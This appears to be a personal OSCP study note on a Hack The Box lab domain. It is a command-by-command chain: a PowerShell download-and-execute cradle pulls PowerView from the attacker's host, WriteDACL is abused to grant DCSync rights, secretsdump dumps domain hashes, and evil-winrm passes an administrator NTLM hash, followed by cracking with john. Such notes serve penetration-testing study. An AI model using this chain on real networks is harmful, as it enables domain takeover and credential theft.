give our new user the DCSync rights

First, we transfer the `Powerview` binary using the `upload` feature with evil-winrm. Importing PowerView allows us to run commands like "Add-DomainObjectAcl," which is needed to abuse the `WriteDACL` permission.
  
### Import PowerView.ps1

```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

```
powershell -ep bypass 
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const apage = dv.page("Synced OSCP Notes/Guides/Copy File From Kali to Windows target");const filename = apage?.["filename"] ?? "NO FILENAME FOUND";

const command = `iex(new-object net.webclient).downloadstring('http://${KaliIP}:80/PowerView.ps1')`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

**Converts the plaintext password into a PowerShell** `SecureString` **and stores it in** `$SecPassword`
```
$SecPassword = ConvertTo-SecureString 'pass123!' -AsPlainText -Force
```

**Create a PSCredential object**
```
$Cred = New-Object System.Management.Automation.PSCredential('Retric@htb.local', $SecPassword)
```

**Grant DCSync rights**
```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity Retric -Rights DCSync
```

---

If no errors, time to dump the hash
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const ip = page?.IP ?? "NO IP FOUND";

const command = `impacket-secretsdump {domain}/Retric:pass123@${ip} > secretsdump_output.txt`;

dv.paragraph("```bash\n" + command + "\n```");
```
Cleanse the data to username:ntlm hash
```
grep -E ':[0-9]+:' secretsdump_output.txt | awk -F ':' '{print $1":"$4}' > ntlm_hashes.txt
```

Login with WinRM using 2nd portion of hash

```
evil-winrm -i 10.129.95.210 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

Crack if needed 

This is the hash.txt format
```dataviewjs
const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const hash = pagea?.["hash"] ?? "NO HASH FOUND";


```
```dataviewjs
const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const hash = pagea?.["hash"] ?? "NO HASH FOUND";

const command = `echo Administrator:${hash} > hash.txt`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
